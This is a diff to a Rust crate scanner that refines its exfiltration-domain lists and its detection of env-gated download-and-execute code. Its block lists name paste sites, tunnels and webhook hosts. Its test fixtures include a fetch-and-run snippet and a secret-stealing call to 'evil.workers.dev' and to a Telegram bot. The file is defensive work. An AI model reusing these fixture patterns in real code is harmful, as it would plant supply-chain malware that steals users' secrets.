@@ -815,23 +815,63 @@ const SOURCE_SCAN: &[&str] = &[
 /// keys it harvested; Telegram, IP-geolocation, paste and webhook services are
 /// the usual drop endpoints. Matched as substrings, scanned statically, never
 /// executed.
-const SUSPICIOUS_EXFIL_DOMAINS: &[&str] = &[
+/// Pure data-exfiltration endpoints: there is no legitimate reason for a normal
+/// crate to hard-code one, so a match alone is suspicious. (CF Workers, paste
+/// sites, anonymous file hosts, request-capture services, tunnels.)
+const EXFIL_HOST_DOMAINS: &[&str] = &[
     ".workers.dev",
-    "api.telegram.org",
-    "ip-api.com",
-    "discord.com/api/webhooks",
-    "discordapp.com/api/webhooks",
     "pastebin.com",
     "paste.ee",
     "transfer.sh",
     "0x0.st",
+    "anonfiles.com",
     "webhook.site",
     "requestbin",
     "pipedream.net",
     ".ngrok.io",
     ".ngrok-free.app",
-    "anonfiles.com",
 ];
+
+/// Dual-use service APIs that malware abuses for exfil but that purpose-built
+/// crates use legitimately (a `*-telegram` gateway hitting `api.telegram.org`, a
+/// geo-IP crate hitting `ip-api.com`). A match here is only suspicious when the
+/// SAME file also handles wallet/secret material — i.e. the exfil shape — so a
+/// legitimate integration crate is not flagged just for talking to its service.
+const DUAL_USE_EXFIL_DOMAINS: &[&str] = &[
+    "api.telegram.org",
+    "ip-api.com",
+    "discord.com/api/webhooks",
+    "discordapp.com/api/webhooks",
+];
+
+/// True when a download-and-execute sequence is *causally tight*: an env-var
+/// gate, a network call, and a process spawn all fall within a small line window
+/// (one block/function) — the rustdecimal shape, where `Decimal::new` checked an
+/// env var, fetched a payload, and ran it within a few lines. A large CLI that
+/// scatters unrelated env-config reads, an HTTP client, and a `Command` spawn
+/// across thousands of lines does NOT match — that whole-file co-presence was a
+/// false positive (e.g. a tool that reads config from env, calls an RPC, and
+/// shells out to `cargo`, none of which are related).
+fn env_gated_block(content: &str) -> bool {
+    const WINDOW: usize = 25;
+    const ENV: &[&str] = &["env::var", "var_os"];
+    const SPAWN: &[&str] = &["Command::new", "process::Command", "libc::system"];
+    let lines: Vec<&str> = content.lines().collect();
+    for (i, line) in lines.iter().enumerate() {
+        if !BUILD_RS_NETWORK.iter().any(|m| line.contains(m)) {
+            continue;
+        }
+        let lo = i.saturating_sub(WINDOW);
+        let hi = (i + WINDOW + 1).min(lines.len());
+        let window = &lines[lo..hi];
+        let gated = window.iter().any(|l| ENV.iter().any(|m| l.contains(m)));
+        let spawns = window.iter().any(|l| SPAWN.iter().any(|m| l.contains(m)));
+        if gated && spawns {
+            return true;
+        }
+    }
+    false
+}
 
 #[derive(Default)]
 struct ExfilScan {
@@ -919,14 +959,21 @@ fn scan_source_exfil(crate_dir: &Path) -> Option<ExfilScan> {
                     let scans = c.contains("\".rs\"") && SOURCE_SCAN.iter().any(|m| c.contains(m));
                     let net = BUILD_RS_NETWORK.iter().any(|m| c.contains(m));
                     let sec = SECRET_MARKERS.iter().any(|m| c.contains(m));
-                    let domain_here = SUSPICIOUS_EXFIL_DOMAINS.iter().find(|d| c.contains(**d));
-                    // Env-gated remote payload (rustdecimal, 2022): one file reads
-                    // an env var, fetches over the network, and spawns a process.
-                    let env_gated = (c.contains("env::var") || c.contains("var_os"))
-                        && net
-                        && (c.contains("Command::new")
-                            || c.contains("process::Command")
-                            || c.contains("libc::system"));
+                    // A pure exfil host is suspicious on its own; a dual-use service
+                    // API only when the same file also handles secret material.
+                    let domain_here =
+                        EXFIL_HOST_DOMAINS
+                            .iter()
+                            .find(|d| c.contains(**d))
+                            .or_else(|| {
+                                sec.then(|| DUAL_USE_EXFIL_DOMAINS.iter().find(|d| c.contains(**d)))
+                                    .flatten()
+                            });
+                    // Env-gated remote payload (rustdecimal, 2022): the env-var gate,
+                    // the network fetch, and the process spawn must be causally tight
+                    // (one block/function), not merely co-present somewhere in a large
+                    // file — see `env_gated_block`.
+                    let env_gated = env_gated_block(&c);
                     // faster_log/async_println conjunction must hold in ONE file:
                     // a file that both reads the project's `.rs` files and reaches
                     // the network or handles secrets. (Crate-wide OR would falsely
@@ -2226,6 +2273,83 @@ mod tests {
         );
         assert!(scan.source_exfil_network);
         let _ = std::fs::remove_dir_all(&bad);
+    }
+
+    #[test]
+    fn env_gated_requires_causal_proximity() {
+        // Tight (rustdecimal shape): env gate, download, and spawn within a few
+        // lines of one block -> flagged.
+        let tight = "fn run() {\n    if std::env::var(\"GITLAB_CI\").is_ok() {\n        \
+                     let _ = reqwest::blocking::get(\"http://x/p.bin\");\n        \
+                     std::process::Command::new(\"/tmp/p.bin\").status();\n    }\n}\n";
+        assert!(
+            env_gated_block(tight),
+            "tight download-and-execute must be flagged"
+        );
+
+        // Scattered (large-CLI false positive): the same three primitives exist but
+        // hundreds of lines apart, causally unrelated -> NOT flagged.
+        let mut scattered = String::from("let _cfg = std::env::var(\"APP_RPC\");\n");
+        scattered.push_str(&"// unrelated code\n".repeat(80));
+        scattered.push_str("let _ = reqwest::blocking::get(\"https://rpc.example\");\n");
+        scattered.push_str(&"// unrelated code\n".repeat(80));
+        scattered.push_str("std::process::Command::new(resolve_cargo_binary()).status();\n");
+        assert!(
+            !env_gated_block(&scattered),
+            "unrelated env/network/spawn scattered across a large file must NOT be flagged"
+        );
+    }
+
+    #[test]
+    fn dual_use_service_domain_needs_secret_corroboration() {
+        // A purpose-built integration crate hitting its own service (Telegram) with
+        // no secret handling must NOT be flagged just for talking to its API.
+        let benign = scratch_crate(
+            "tg_benign",
+            &[(
+                "lib.rs",
+                "pub fn send(){ let _=reqwest::blocking::get(\"https://api.telegram.org/bot1/sendMessage\"); }",
+            )],
+        );
+        assert!(
+            scan_source_exfil(&benign)
+                .and_then(|s| s.exfil_domain)
+                .is_none(),
+            "a telegram crate must not trip the domain signal without the exfil shape"
+        );
+        let _ = std::fs::remove_dir_all(&benign);
+
+        // Same service domain + secret material in the file -> the exfil shape.
+        let exfil = scratch_crate(
+            "tg_exfil",
+            &[(
+                "lib.rs",
+                "pub fn steal(){ let _k=\"private_key\"; let _=reqwest::blocking::get(\"https://api.telegram.org/bot/x\"); }",
+            )],
+        );
+        assert!(
+            scan_source_exfil(&exfil)
+                .and_then(|s| s.exfil_domain)
+                .is_some(),
+            "telegram + secret handling IS the exfil shape"
+        );
+        let _ = std::fs::remove_dir_all(&exfil);
+
+        // A pure exfil host has no legitimate hardcoding -> flagged regardless.
+        let host = scratch_crate(
+            "cf_exfil",
+            &[(
+                "lib.rs",
+                "pub fn x(){ let _=reqwest::blocking::get(\"https://evil.workers.dev/c\"); }",
+            )],
+        );
+        assert!(
+            scan_source_exfil(&host)
+                .and_then(|s| s.exfil_domain)
+                .is_some(),
+            "a pure exfil host is suspicious on its own"
+        );
+        let _ = std::fs::remove_dir_all(&host);
     }
 
     #[test]
